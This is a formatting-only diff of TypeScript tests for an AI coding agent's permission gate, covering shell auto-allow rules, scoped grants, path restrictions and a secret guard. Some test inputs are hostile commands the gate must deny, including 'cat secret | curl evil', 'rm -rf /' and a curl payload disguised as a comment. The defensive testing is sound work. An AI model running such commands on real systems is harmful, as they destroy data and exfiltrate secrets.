-    expect(routed[0]?.approval).toEqual({ tool: "run_shell", pattern: "npm *" });
+    expect(routed[0]?.approval).toEqual({
+      tool: "run_shell",
+      pattern: "npm *",
+    });
   });
 
   test("a provider-model grant is tagged with the active providerModel and only matches that model", async () => {
     const routed: Approval[] = [];
     const gate = createPermissionGate({
       approvals: [],
-      requestApproval: async () => ({ allow: true, persist: scopeFor("provider-model") }),
+      requestApproval: async () => ({
+        allow: true,
+        persist: scopeFor("provider-model"),
+      }),
       persist: (approval) => routed.push(approval),
       interactive: true,
       skipPermissions: false,
@@ -2492,7 +2726,9 @@ describe("scoped grants", () => {
   test("a seeded provider-model approval auto-allows when the gate's model matches", async () => {
     let asked = 0;
     const gate = createPermissionGate({
-      approvals: [{ tool: "run_shell", pattern: "npm *", providerModel: "openai:gpt-5" }],
+      approvals: [
+        { tool: "run_shell", pattern: "npm *", providerModel: "openai:gpt-5" },
+      ],
       requestApproval: async () => {
         asked++;
         return { allow: true };
@@ -2511,7 +2747,10 @@ describe("scoped grants", () => {
     const routed: Approval[] = [];
     const gate = createPermissionGate({
       approvals: [],
-      requestApproval: async () => ({ allow: true, persist: scopeFor("project") }),
+      requestApproval: async () => ({
+        allow: true,
+        persist: scopeFor("project"),
+      }),
       persist: (approval) => routed.push(approval),
       interactive: true,
       skipPermissions: false,
@@ -2520,7 +2759,11 @@ describe("scoped grants", () => {
       model: "gpt-5",
     });
     await gate.evaluate(shellCall("npm test"));
-    expect(routed[0]).toEqual({ tool: "run_shell", pattern: "npm *", cwd: process.cwd() });
+    expect(routed[0]).toEqual({
+      tool: "run_shell",
+      pattern: "npm *",
+      cwd: process.cwd(),
+    });
   });
 });
 
@@ -2540,25 +2783,39 @@ describe("isAutoAllowedShellCall", () => {
 
   test("does not auto-allow find (blocked as open-ended search by authz policy)", () => {
     expect(isAutoAllowedShellCall(shellCall("find . -name x"))).toBe(false);
-    expect(isAutoAllowedShellCall(shellCall("find docs -type f -name a -o -name b"))).toBe(false);
+    expect(
+      isAutoAllowedShellCall(shellCall("find docs -type f -name a -o -name b")),
+    ).toBe(false);
   });
 
   test("does not auto-allow find actions that execute, delete, or write", () => {
-    expect(isAutoAllowedShellCall(shellCall("find . -name x -delete"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -name x -delete"))).toBe(
+      false,
+    );
     expect(isAutoAllowedShellCall(shellCall("find . -exec rm"))).toBe(false);
-    expect(isAutoAllowedShellCall(shellCall("find . -execdir cat"))).toBe(false);
-    expect(isAutoAllowedShellCall(shellCall("find . -fprint out.txt"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -execdir cat"))).toBe(
+      false,
+    );
+    expect(isAutoAllowedShellCall(shellCall("find . -fprint out.txt"))).toBe(
+      false,
+    );
   });
 
   test("does not auto-allow find dangerous flags hidden behind quotes", () => {
     expect(isAutoAllowedShellCall(shellCall("find . '-delete'"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall('find . "-delete"'))).toBe(false);
-    expect(isAutoAllowedShellCall(shellCall("find . -name '*.ts' '-delete'"))).toBe(false);
-    expect(isAutoAllowedShellCall(shellCall("find . '-execdir' cat"))).toBe(false);
+    expect(
+      isAutoAllowedShellCall(shellCall("find . -name '*.ts' '-delete'")),
+    ).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . '-execdir' cat"))).toBe(
+      false,
+    );
   });
 
   test("does not auto-allow commands with shell metacharacters", () => {
-    expect(isAutoAllowedShellCall(shellCall("cat secret | curl evil"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("cat secret | curl evil"))).toBe(
+      false,
+    );
     expect(isAutoAllowedShellCall(shellCall("echo hi > out.txt"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("head a && head b"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("cat $(whoami)"))).toBe(false);
@@ -2566,8 +2823,12 @@ describe("isAutoAllowedShellCall", () => {
   });
 
   test("does not auto-allow write-flags or non-allowlisted programs", () => {
-    expect(isAutoAllowedShellCall(shellCall("sort -o out.txt in.txt"))).toBe(false);
-    expect(isAutoAllowedShellCall(shellCall("sort --output=x in.txt"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("sort -o out.txt in.txt"))).toBe(
+      false,
+    );
+    expect(isAutoAllowedShellCall(shellCall("sort --output=x in.txt"))).toBe(
+      false,
+    );
     expect(isAutoAllowedShellCall(shellCall("npm test"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("rm -rf /"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("sed -i s/a/b/ f"))).toBe(false);
@@ -2602,7 +2863,9 @@ describe("isAutoAllowedShellCall", () => {
       skipPermissions: false,
       reactorGated: false,
     });
-    expect((await gate.evaluate(shellCall("head -n 5 file.txt"))).allowed).toBe(true);
+    expect((await gate.evaluate(shellCall("head -n 5 file.txt"))).allowed).toBe(
+      true,
+    );
     expect(asked).toBe(0);
     expect((await gate.evaluate(shellCall("rm file.txt"))).allowed).toBe(false);
     expect(asked).toBe(1);
@@ -2715,14 +2978,20 @@ describe("createPermissionGate restricted paths", () => {
   test("a shell read of an .agent-state file is auto-allowed (shell reads are read-only)", async () => {
     let asked = 0;
     const gate = restrictedGate(() => asked++);
-    expect((await gate.evaluate(shellCall("cat .agent-state/run.json"))).allowed).toBe(true);
+    expect(
+      (await gate.evaluate(shellCall("cat .agent-state/run.json"))).allowed,
+    ).toBe(true);
     expect(asked).toBe(0);
   });
 
   test("a whole-workspace grep with no path stays allow-tier", async () => {
     let asked = 0;
     const gate = restrictedGate(() => asked++);
-    const verdict = await gate.evaluate({ id: "c", name: "grep", arguments: { pattern: "foo" } });
+    const verdict = await gate.evaluate({
+      id: "c",
+      name: "grep",
+      arguments: { pattern: "foo" },
+    });
     expect(verdict.allowed).toBe(true);
     expect(asked).toBe(0);
   });
@@ -2733,7 +3002,9 @@ describe("createPermissionGate restricted paths", () => {
   // those paths are ask-gated instead (see classify-security tests).
   test(".env reads are still hard-blocked by the secret-guard plugin even though the gate auto-allows gitignored reads", async () => {
     const gate = restrictedGate(() => {
-      throw new Error("the plugin should block before the gate is ever consulted for approval");
+      throw new Error(
+        "the plugin should block before the gate is ever consulted for approval",
+      );
     });
     const gateVerdict = await gate.evaluate({
       id: "c",
@@ -2743,7 +3014,8 @@ describe("createPermissionGate restricted paths", () => {
     expect(gateVerdict.allowed).toBe(true);
 
     const guardMiddleware = secretGuardPlugin().middleware;
-    if (guardMiddleware === undefined) throw new Error("secretGuardPlugin must provide middleware");
+    if (guardMiddleware === undefined)
+      throw new Error("secretGuardPlugin must provide middleware");
     const next = async (call: ToolCall) => ({
       callId: call.id,
       content: "leaked secret",
@@ -2855,7 +3127,12 @@ describe("read-only tools in auto mode", () => {
     const verdict = await gate.evaluate({
       id: "c",
       name: "lsp",
-      arguments: { operation: "hover", filePath: "src/index.ts", line: 1, character: 1 },
+      arguments: {
+        operation: "hover",
+        filePath: "src/index.ts",
+        line: 1,
+        character: 1,
+      },
     });
     expect(verdict.allowed).toBe(true);
     expect(asked).toBe(0);
@@ -2881,7 +3158,12 @@ describe("read-only tools in auto mode", () => {
     const verdict = await gate.evaluate({
       id: "c",
       name: "lsp",
-      arguments: { operation: "hover", filePath: target, line: 1, character: 1 },
+      arguments: {
+        operation: "hover",
+        filePath: target,
+        line: 1,
+        character: 1,
+      },
     });
     expect(verdict.allowed).toBe(true);
     expect(asked).toBe(1);
@@ -2925,17 +3207,40 @@ describe("read-only tools in auto mode", () => {
       auto: true,
     });
     expect(
-      (await gate.evaluate({ id: "c", name: "mcp__acme__list_projects", arguments: {} })).allowed,
+      (
+        await gate.evaluate({
+          id: "c",
+          name: "mcp__acme__list_projects",
+          arguments: {},
+        })
+      ).allowed,
     ).toBe(true);
     expect(
-      (await gate.evaluate({ id: "c", name: "mcp__linear__get_issue", arguments: { id: "X-1" } }))
-        .allowed,
+      (
+        await gate.evaluate({
+          id: "c",
+          name: "mcp__linear__get_issue",
+          arguments: { id: "X-1" },
+        })
+      ).allowed,
     ).toBe(true);
     expect(
-      (await gate.evaluate({ id: "c", name: "mcp__acme__save_project", arguments: {} })).allowed,
+      (
+        await gate.evaluate({
+          id: "c",
+          name: "mcp__acme__save_project",
+          arguments: {},
+        })
+      ).allowed,
     ).toBe(false);
     expect(
-      (await gate.evaluate({ id: "c", name: "some_unknown_tool", arguments: {} })).allowed,
+      (
+        await gate.evaluate({
+          id: "c",
+          name: "some_unknown_tool",
+          arguments: {},
+        })
+      ).allowed,
     ).toBe(false);
     expect(asked).toBe(2);
   });
@@ -3293,18 +3598,24 @@ describe("listWorktreeRoots", () => {
     const { repo } = createRepoWithWorktree();
     const roots = await listWorktreeRoots(repo);
     const outside = mkdtempSync(join(tmpdir(), "intercode-unrelated-"));
-    expect(resolveWorkspacePath(repo, join(outside, "payload.ts"), () => roots)).toBeUndefined();
+    expect(
+      resolveWorkspacePath(repo, join(outside, "payload.ts"), () => roots),
+    ).toBeUndefined();
   });
 
   test("pathEscapePlugin resolves a relative ../ path into an allowlisted sibling worktree instead of rejecting it pre-realpath", async () => {
     const { repo } = createRepoWithWorktree();
     const roots = await listWorktreeRoots(repo);
     const plugin = pathEscapePlugin(repo, () => roots);
-    const handler = plugin.middleware!((call) =>
+    const handler = defined(plugin.middleware)((call) =>
       Promise.resolve({ callId: call.id, content: "ok" }),
     );
     const result = await handler(
-      { id: "c", name: "read_file", arguments: { path: join("..", "secondary", "notes.md") } },
+      {
+        id: "c",
+        name: "read_file",
+        arguments: { path: join("..", "secondary", "notes.md") },
+      },
       new AbortController().signal,
     );
     expect(result.isError).not.toBe(true);
@@ -3316,7 +3627,7 @@ describe("listWorktreeRoots", () => {
     const outside = mkdtempSync(join(tmpdir(), "intercode-unrelated-plugin-"));
     const relativeToOutside = relative(repo, join(outside, "payload.ts"));
     const plugin = pathEscapePlugin(repo, () => roots);
-    const handler = plugin.middleware!((call) =>
+    const handler = defined(plugin.middleware)((call) =>
       Promise.resolve({ callId: call.id, content: "ok" }),
     );
     const result = await handler(
@@ -3402,10 +3713,15 @@ describe("createWorktreeRootsProvider lazy re-discovery", () => {
       listCalls++;
       return [];
     };
-    const restriction = createPathRestriction(repo, createWorktreeRootsProvider(repo, lister));
+    const restriction = createPathRestriction(
+      repo,
+      createWorktreeRootsProvider(repo, lister),
+    );
     const outside = mkdtempSync(join(tmpdir(), "corbits-burst-"));
     for (let i = 0; i < 5; i++) {
-      expect(restriction.isRestricted(join(outside, `file-${i}.ts`), false)).toBe(true);
+      expect(
+        restriction.isRestricted(join(outside, `file-${i}.ts`), false),
+      ).toBe(true);
     }
     // One call to seed the initial (empty) roots, and the debounce window
     // suppresses every forced refresh that follows within it.
@@ -3464,7 +3780,8 @@ describe("comment-insensitive shell grants", () => {
       persist: (a) => persisted.push(a),
       requestApproval: async (request) => {
         const scope = request.scopes[0];
-        if (scope === undefined) throw new Error("expected a persistable scope");
+        if (scope === undefined)
+          throw new Error("expected a persistable scope");
         // Force a persisted (not merely session) grant so `persisted` below
         // captures it, mirroring an operator picking "Always allow" broadly.
         return { allow: true, persist: { ...scope, grant: "project" } };
@@ -3488,22 +3805,30 @@ describe("comment-insensitive shell grants", () => {
 
   test("a grant for a commented multi-segment command replays for the same comment", async () => {
     const replayGate = await grantThenReplayGate(withCommentA);
-    expect((await replayGate.evaluate(shellCall(withCommentA))).allowed).toBe(true);
+    expect((await replayGate.evaluate(shellCall(withCommentA))).allowed).toBe(
+      true,
+    );
   });
 
   test("a grant for a commented multi-segment command replays for a different comment", async () => {
     const replayGate = await grantThenReplayGate(withCommentA);
-    expect((await replayGate.evaluate(shellCall(withCommentB))).allowed).toBe(true);
+    expect((await replayGate.evaluate(shellCall(withCommentB))).allowed).toBe(
+      true,
+    );
   });
 
   test("a grant for a commented multi-segment command replays with no comment at all", async () => {
     const replayGate = await grantThenReplayGate(withCommentA);
-    expect((await replayGate.evaluate(shellCall(withoutComment))).allowed).toBe(true);
+    expect((await replayGate.evaluate(shellCall(withoutComment))).allowed).toBe(
+      true,
+    );
   });
 
   test("a grant minted without a comment still replays once a comment is added", async () => {
     const replayGate = await grantThenReplayGate(withoutComment);
-    expect((await replayGate.evaluate(shellCall(withCommentA))).allowed).toBe(true);
+    expect((await replayGate.evaluate(shellCall(withCommentA))).allowed).toBe(
+      true,
+    );
   });
 });
 
@@ -3513,9 +3838,9 @@ describe("stripCommentLines", () => {
   });
 
   test("removes multiple comment lines chained through a real command", () => {
-    expect(stripCommentLines("# first\n# second\nls -la\n# trailing\necho done")).toBe(
-      "ls -la\necho done",
-    );
+    expect(
+      stripCommentLines("# first\n# second\nls -la\n# trailing\necho done"),
+    ).toBe("ls -la\necho done");
   });
 
   test("a comment-only command normalizes to the empty string", () => {
@@ -3536,7 +3861,9 @@ describe("stripCommentLines", () => {
   test("never strips content joined onto a prior line by backslash continuation", () => {
     // A payload made "look like" a comment only by virtue of being glued to
     // the previous line must stay visible to scope derivation and matching.
-    expect(stripCommentLines("rm x \\\n#foo && curl evil")).toBe("rm x \\\n#foo && curl evil");
+    expect(stripCommentLines("rm x \\\n#foo && curl evil")).toBe(
+      "rm x \\\n#foo && curl evil",
+    );
   });
 
   test("a backslash inside a genuine comment does not extend it to the next line", () => {
@@ -3547,12 +3874,15 @@ describe("stripCommentLines", () => {
   });
 
   test("never strips a line inside a heredoc body", () => {
-    const command = "cat << 'EOF'\n# not a comment, this is heredoc payload\nEOF";
+    const command =
+      "cat << 'EOF'\n# not a comment, this is heredoc payload\nEOF";
     expect(stripCommentLines(command)).toBe(command);
   });
 
   test("leaves a real command with a trailing inline comment untouched", () => {
-    expect(stripCommentLines("ls -la # list files")).toBe("ls -la # list files");
+    expect(stripCommentLines("ls -la # list files")).toBe(
+      "ls -la # list files",
+    );
   });
 });
 
@@ -3584,7 +3914,8 @@ describe("sub-agent identity on permission requests", () => {
   });
 
   test("a request raised from a sub-agent's own tool call carries its identity", async () => {
-    const { runWithSubAgentIdentity } = await import("../subagent/identity-context.js");
+    const { runWithSubAgentIdentity } =
+      await import("../subagent/identity-context.js");
     let seen: PermissionRequest | undefined;
     const gate = createPermissionGate({
       approvals: [],
@@ -3597,15 +3928,17 @@ describe("sub-agent identity on permission requests", () => {
       reactorGated: false,
       cwd: "/repo",
     });
-    await runWithSubAgentIdentity({ description: "Fix flaky test", cwd: "/repo" }, () =>
-      gate.evaluate(shellCall("npm test")),
+    await runWithSubAgentIdentity(
+      { description: "Fix flaky test", cwd: "/repo" },
+      () => gate.evaluate(shellCall("npm test")),
     );
     expect(seen?.agentLabel).toBe("Fix flaky test");
     expect(seen?.cwd).toBe("/repo");
   });
 
   test("identity does not leak across concurrent calls without an active ALS scope", async () => {
-    const { runWithSubAgentIdentity } = await import("../subagent/identity-context.js");
+    const { runWithSubAgentIdentity } =
+      await import("../subagent/identity-context.js");
     const seen: (PermissionRequest | undefined)[] = [];
     const gate = createPermissionGate({
       approvals: [],
@@ -3631,7 +3964,8 @@ describe("sub-agent identity on permission requests", () => {
   });
 
   test("two concurrent ALS scopes keep their agent labels isolated", async () => {
-    const { runWithSubAgentIdentity } = await import("../subagent/identity-context.js");
+    const { runWithSubAgentIdentity } =
+      await import("../subagent/identity-context.js");
     const seen: PermissionRequest[] = [];
     const gate = createPermissionGate({
       approvals: [],
@@ -3671,7 +4005,10 @@ describe("project-scoped grants match sub-agent worktree requests (CL-5662)", ()
   // A sibling worktree, not nested under the session root — mirrors CL-4929's
   // real-world layout where a sub-agent's worktree lives outside the repo
   // entirely (e.g. a dispatch worktrees directory next to the checkout).
-  const createRepoWithSiblingWorktree = (): { repo: string; worktree: string } => {
+  const createRepoWithSiblingWorktree = (): {
+    repo: string;
+    worktree: string;
+  } => {
     const base = mkdtempSync(join(tmpdir(), "corbits-project-grant-"));
     const repo = join(base, "repo");
     const worktree = join(base, "sibling-worktree");
@@ -3683,7 +4020,8 @@ describe("project-scoped grants match sub-agent worktree requests (CL-5662)", ()
   };
 
   test("a project grant minted at the session root matches a sub-agent request whose cwd is a worktree under that root", async () => {
-    const { runWithSubAgentIdentity } = await import("../subagent/identity-context.js");
+    const { runWithSubAgentIdentity } =
+      await import("../subagent/identity-context.js");
     const { repo, worktree } = createRepoWithSiblingWorktree();
     let asked = 0;
     const gate = createPermissionGate({
@@ -3693,7 +4031,12 @@ describe("project-scoped grants match sub-agent worktree requests (CL-5662)", ()
         asked++;
         return {
           allow: true,
-          persist: { id: "exact", label: "Always allow", pattern: "npm *", grant: "project" },
+          persist: {
+            id: "exact",
+            label: "Always allow",
+            pattern: "npm *",
+            grant: "project",
+          },
         };
       },
       interactive: true,
@@ -3708,8 +4051,9 @@ describe("project-scoped grants match sub-agent worktree requests (CL-5662)", ()
 
     // Second call, from a sub-agent running in the sibling worktree, must
     // replay the same project grant instead of asking again.
-    const second = await runWithSubAgentIdentity({ description: "Worker", cwd: worktree }, () =>
-      gate.evaluate(shellCall("npm run build")),
+    const second = await runWithSubAgentIdentity(
+      { description: "Worker", cwd: worktree },
+      () => gate.evaluate(shellCall("npm run build")),
     );
     expect(second.allowed).toBe(true);
     expect(asked).toBe(1);
@@ -3720,7 +4064,8 @@ describe("project-scoped grants match sub-agent worktree requests (CL-5662)", ()
   // just as "foreign" on disk as a legitimate worktree would look to a naive
   // check. Must pass both before and after the worktree-matching fix.
   test("a project grant does not match a request from an unrelated project root", async () => {
-    const { runWithSubAgentIdentity } = await import("../subagent/identity-context.js");
+    const { runWithSubAgentIdentity } =
+      await import("../subagent/identity-context.js");
     const { repo } = createRepoWithSiblingWorktree();
     const unrelated = mkdtempSync(join(tmpdir(), "corbits-unrelated-project-"));
     let asked = 0;
@@ -3731,7 +4076,12 @@ describe("project-scoped grants match sub-agent worktree requests (CL-5662)", ()
         asked++;
         return {
           allow: true,
-          persist: { id: "exact", label: "Always allow", pattern: "npm *", grant: "project" },
+          persist: {
+            id: "exact",
+            label: "Always allow",
+            pattern: "npm *",
+            grant: "project",
+          },
         };
       },
       interactive: true,
@@ -3743,8 +4093,9 @@ describe("project-scoped grants match sub-agent worktree requests (CL-5662)", ()
     expect(first.allowed).toBe(true);
     expect(asked).toBe(1);
 
-    const second = await runWithSubAgentIdentity({ description: "Worker", cwd: unrelated }, () =>
-      gate.evaluate(shellCall("npm run build")),
+    const second = await runWithSubAgentIdentity(
+      { description: "Worker", cwd: unrelated },
+      () => gate.evaluate(shellCall("npm run build")),
     );
     expect(second.allowed).toBe(true);
     // The unrelated cwd must still ask — the grant did not leak across
@@ -3761,7 +4112,8 @@ describe("project-scoped grants match sub-agent worktree requests (CL-5662)", ()
   // actually checks: that an unscoped (no-cwd) grant matches irrespective of
   // where the request originated.
   test("session and provider-model grants still match a sub-agent request regardless of cwd", async () => {
-    const { runWithSubAgentIdentity } = await import("../subagent/identity-context.js");
+    const { runWithSubAgentIdentity } =
+      await import("../subagent/identity-context.js");
     const { repo } = createRepoWithSiblingWorktree();
     const unrelated = mkdtempSync(join(tmpdir(), "corbits-unrelated-project-"));
     const target = join(repo, "notes.md");
@@ -3773,7 +4125,12 @@ describe("project-scoped grants match sub-agent worktree requests (CL-5662)", ()
         asked++;
         return {
           allow: true,
-          persist: { id: "exact", label: "Always allow", pattern: target, grant: "session" },
+          persist: {
+            id: "exact",
+            label: "Always allow",
+            pattern: target,
+            grant: "session",
+          },
         };
       },
       interactive: true,
@@ -3781,12 +4138,22 @@ describe("project-scoped grants match sub-agent worktree requests (CL-5662)", ()
       reactorGated: false,
     });
 
-    const first = await gate.evaluate({ id: "a", name: "write_file", arguments: { path: target } });
+    const first = await gate.evaluate({
+      id: "a",
+      name: "write_file",
+      arguments: { path: target },
+    });
     expect(first.allowed).toBe(true);
     expect(asked).toBe(1);
 
-    const second = await runWithSubAgentIdentity({ description: "Worker", cwd: unrelated }, () =>
-      gate.evaluate({ id: "b", name: "write_file", arguments: { path: target } }),
+    const second = await runWithSubAgentIdentity(
+      { description: "Worker", cwd: unrelated },
+      () =>
+        gate.evaluate({
+          id: "b",
+          name: "write_file",
+          arguments: { path: target },
+        }),
     );
     expect(second.allowed).toBe(true);
     expect(asked).toBe(1);
@@ -3818,7 +4185,8 @@ describe("sub-agent auto-allow uses the process cwd, not the session cwd", () =>
       reactorGated: false,
       cwd: sessionCwd,
     });
-    const { runWithSubAgentIdentity } = await import("../subagent/identity-context.js");
+    const { runWithSubAgentIdentity } =
+      await import("../subagent/identity-context.js");
     const verdict = await runWithSubAgentIdentity(
       { description: "Worktree worker", cwd: agentCwd },
       () => gate.evaluate(shellCall("cat local.txt")),
@@ -3851,7 +4219,8 @@ describe("sub-agent auto-allow uses the process cwd, not the session cwd", () =>
       reactorGated: false,
       cwd: sessionCwd,
     });
-    const { runWithSubAgentIdentity } = await import("../subagent/identity-context.js");
+    const { runWithSubAgentIdentity } =
+      await import("../subagent/identity-context.js");
     const verdict = await runWithSubAgentIdentity(
       { description: "Nested worktree", cwd: agentCwd },
       () => gate.evaluate(shellCall("cat ../session-only.txt")),
